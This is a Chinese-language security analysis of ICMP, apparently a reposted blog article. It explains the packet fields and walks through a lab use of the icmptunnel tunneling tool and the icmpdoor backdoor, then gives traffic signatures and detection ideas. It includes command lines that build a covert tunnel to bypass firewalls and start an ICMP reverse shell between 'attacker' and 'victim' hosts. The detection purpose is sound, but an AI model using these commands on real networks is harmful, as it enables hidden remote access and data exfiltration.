## **概述**

ICMP（ Internet Control Message Protocol）互联网控制消息协议，它用于TCP/IP
网络中发送控制消息，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。通过这些信息，网络管理者可以对所发生的问题作出诊断，然后采取适当的措施解决问题。攻击者也可以利用控制消息发送恶意数据包实现对主机的控制。

##  **ICMP协议分析**

ICMP报文信息被封装在IP数据包内部，作为IP数据包的数据部分通过互联网传递。当IP报头中的Protocol(协议)字段值为1时，说明是一个ICMP报文。![1690687294_64c5d73e9438a8cecbcc5.png!small?1690687295209](https://image.3001.net/images/20230730/1690687294_64c5d73e9438a8cecbcc5.png!small?1690687295209)ICMP报文包含三个固定字段。Type字段表示ICMP消息的类型；Code字段表示ICMP消息类型细分的子类型；Checksum字段表示ICMP报文的校验值，检验报文传输过程中是否出现差错。Data字段是可选的，包含与ICMP消息相关的附加信息，
**明文传输**
。其内容取决于ICMP消息的类型和代码。长度可以为0，也可以是任意长度。![1690687322_64c5d75a245205f492f68.png!small?1690687322677](https://image.3001.net/images/20230730/1690687322_64c5d75a245205f492f68.png!small?1690687322677)不同的Type和Code值表示不同的ICMP报文类型，对应了数据包处理过程中可能出现的不同错误情况，不同类型的ICMP报文又分为差错报文和查询报文两种，如下表所示。

 **Type**|  **Code**|  **描述**|  **查询/差错**  
---|---|---|---  
0-Echo响应| 0| Echo响应报文| 查询  
3-目的不可达| 0| 目标网络不可达报文| 差错  
1| 目标主机不可达报文| 差错  
2| 目标协议不可达报文| 差错  
3| 目标端口不可达报文| 差错  
4| 要求分段并设置DF flag标志报文| 差错  
5| 源路由失败报文| 差错  
6| 未知的目标网络报文| 差错  
7| 未知的目标主机报文| 差错  
8| 源主机隔离报文| 差错  
9| 禁止访问的网络报文| 差错  
10| 禁止访问的主机报文| 差错  
11| 对特定的TOS网络不可达报文| 差错  
12| 对特定的TOS主机不可达报文| 差错  
13| 由于过滤 网络流量被禁止报文| 差错  
14| 主机越权报文| 差错  
15| 优先权终止生效报文| 差错  
5-重定向| 0| 重定向网络报文| 差错  
1| 重定向主机报文| 差错  
2| 基于TOS的网络重定向报文| 差错  
3| 基于TOS的主机重定向报文| 差错  
8-Echo请求| 0| Echo请求报文| 查询  
9-路由器通告| 0| 路由通告报文| 查询  
10-路由器请求| 0| 路由器的发现/选择/请求报文| 查询  
11-ICMP超时| 0| TTL超时报文| 差错  
1| 分片重组超时报文| 差错  
12-参数问题| 0| IP报首部参数错误报文| 差错  
1| 丢失必要选项报文| 差错  
2| 不支持的长度报文| 差错  
13-时间戳请求| 0| 时间戳请求报文| 查询  
14-时间戳应答| 0| 时间戳应答报文| 查询  
15-信息请求| 0| 信息请求报文| 查询  
16-信息应答| 0| 信息应答报文| 查询  
  
来源：https://info.support.huawei.com/info-finder/encyclopedia/zh/ICMP.html

##  **ICMP的应用场景**

###  **ping命令**

日常我们使用ping命令的Type为8。抓取下ping的流量包，可以看到Data段长度有两种分别是48和32。![1690687399_64c5d7a79b6b8997e3678.png!small](https://image.3001.net/images/20230730/1690687399_64c5d7a79b6b8997e3678.png!small)![1690687419_64c5d7bb62e7df406c29e.png!small?1690687419988](https://image.3001.net/images/20230730/1690687419_64c5d7bb62e7df406c29e.png!small?1690687419988)且echo
reply和echo
request的内容一致。![1690687436_64c5d7cc7d2c70c875c7c.png!small?1690687437318](https://image.3001.net/images/20230730/1690687436_64c5d7cc7d2c70c875c7c.png!small?1690687437318)

###  **ICMP隧道**

ICMP隧道（ICMP
Tunneling）是一种网络隧道技术，它利用Internet控制消息协议（ICMP）来在网络上传输数据。ICMP隧道通常用于绕过防火墙或者其他网络限制，将数据封装在ICMP消息的Data字段中，可以将数据包看作是ICMP消息，因此可以在允许ICMP协议通信的网络中传输信息。下面介绍下icmptunnel工具生成的流量。icmptunnel的原理是将内容封装在ICMP
echo数据包中，在ICMP数据包的 "data "字段中发送至代理服务器。代理服务器解压缩数据包并转发到目标服务器。

工具地址：https://github.com/jamesbarlow/icmptunnel

使用方法：

    
    
    git clone https://github.com/jamesbarlow/icmptunnelcd icmptunnel/make

![1690687473_64c5d7f1cf2d4757c2bd7.png!small?1690687474411](https://image.3001.net/images/20230730/1690687473_64c5d7f1cf2d4757c2bd7.png!small?1690687474411)

首先需要在两台机器上禁止ICMP响应。如下命令会阻止内核响应ping数据包：

    
    
    echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

随后，在服务端(172.17.10.43)启动 icmptunnel，并给隧道接口分配一个 IP 地址。

    
    
    ./icmptunnel -s/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0

![1690687502_64c5d80e1c0f6f6f4c4ee.png!small?1690687502738](https://image.3001.net/images/20230730/1690687502_64c5d80e1c0f6f6f4c4ee.png!small?1690687502738)

在客户端(172.17.10.52)，使用 icmptunnel 连接上服务器，并给隧道接口分配一个 IP 地址。

    
    
    ./icmptunnel 172.17.10.43/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0

![1690687523_64c5d82337e54ad82d460.png!small?1690687523928](https://image.3001.net/images/20230730/1690687523_64c5d82337e54ad82d460.png!small?1690687523928)隧道建立完成后，可以看到主机间存在icmp通信流量。其中Type的值为8，说明该隧道工具用的是ICMP
Echo Request消息。发送ICMP Echo Request消息的主机期望接收到一个相应的ICMP Echo
Reply消息，以确认目标主机的存在和可达性。![1690687543_64c5d83729ee823241f25.png!small?1690687543963](https://image.3001.net/images/20230730/1690687543_64c5d83729ee823241f25.png!small?1690687543963)

每个数据包的Data字段都存在默认值"TUNL"，十六进制为54554e4c04。

![1690687564_64c5d84c203089002a3b8.png!small?1690687564796](https://image.3001.net/images/20230730/1690687564_64c5d84c203089002a3b8.png!small?1690687564796)

连接服务端的ssh服务

    
    
    ssh kali@10.0.0.1

![1690687587_64c5d86327cdf8565d71c.png!small?1690687587676](https://image.3001.net/images/20230730/1690687587_64c5d86327cdf8565d71c.png!small?1690687587676)

流量侧存在特征"TUNL" 和 "SSH-2.0-OpenSSH_7.6p1"

![1690687606_64c5d876f08740ade7c6f.png!small?1690687607604](https://image.3001.net/images/20230730/1690687606_64c5d876f08740ade7c6f.png!small?1690687607604)

连接服务端的web服务

    
    
    curl 10.0.0.1:5003﻿

![1690687632_64c5d890a23c793cd46fc.png!small?1690687633124](https://image.3001.net/images/20230730/1690687632_64c5d890a23c793cd46fc.png!small?1690687633124)

流量侧存在特征有"TUNL" 和完整的HTTP请求/响应内容。

![1690687662_64c5d8aea570c0eab0a61.png!small?1690687663411](https://image.3001.net/images/20230730/1690687662_64c5d8aea570c0eab0a61.png!small?1690687663411)

另外发现流量中存在Echo Reply。这可能是由于网络中的问题导致Echo
Reply在传输过程中重复发送或复制。这种情况可能是网络故障或异常的结果，应该被视为异常情况。

![1690687682_64c5d8c2aaeebd818f5ff.png!small?1690687683928](https://image.3001.net/images/20230730/1690687682_64c5d8c2aaeebd818f5ff.png!small?1690687683928)

通过上述分析，icmptunnel的特征如下：

（1）Data字段包含字符"TUNL"

（2）Data字段长度非48和32的数据包需要注意

（3）传输字节比较大的数据，流量中会存在多个echo reply。

  

####  **ICMP后门**

ICMP后门通常是一种隐蔽的攻击技术，因为ICMP流量通常被认为是合法的网络流量，很少受到严格的防火墙或入侵检测系统的监视和过滤。攻击者可以利用ICMP协议的一些字段或选项来隐藏恶意代码或数据，然后在目标系统上的后门程序中解析这些隐藏的信息。

项目地址：https://github.com/krabelize/icmpdoor

使用方法：

attacker(172.17.10.43): python icmp-cnc.py -i eth0 -d 172.17.10.52

victim(172.17.19.52): python icmpdoor.py -i ens32 -d 172.17.10.43

![1690687722_64c5d8ea931f74dd11bde.png!small?1690687723579](https://image.3001.net/images/20230730/1690687722_64c5d8ea931f74dd11bde.png!small?1690687723579)

建立shell连接后，可以看到Type的值为8，说明该工具也是通过Echo request消息传输payload。

![1690687742_64c5d8fe4cfb80b24391d.png!small?1690687742948](https://image.3001.net/images/20230730/1690687742_64c5d8fe4cfb80b24391d.png!small?1690687742948)

如果受害端返回的消息体比较大，则会拆分多个Echo reply传输。

![1690687763_64c5d913cece15e6d6db9.png!small?1690687764783](https://image.3001.net/images/20230730/1690687763_64c5d913cece15e6d6db9.png!small?1690687764783)

另外当在命令行执行curl命令的时候，受害机器可能会hang住。

![1690687784_64c5d928af9bd2e5fd36e.png!small?1690687785373](https://image.3001.net/images/20230730/1690687784_64c5d928af9bd2e5fd36e.png!small?1690687785373)

##  **ICMP检测思路**

通过对上述攻击手法的分析，日常我们在分析ICMP流量的时候可以着重关注Type、Data字段的值。可通过各个以下思路发现异常ICMP流量。1、主机间大量的icmp协议通信。当主机建立icmp隧道会实时发送探活的icmp包，因此流量侧可以看到大量的ICMP流量进出网络。2、异常数据包大小。攻击者通过向每个request和reply注入更大的数据包来减少总数据数量。通常，合法的Echo请求和应答具有固定的标准大小，因此不同的数据报大小可能表明该连接用于隧道传输。3、空的icmp请求。有些黑客工具通过发送空的Data值来探活。  
  
文章来源：公众号huasec

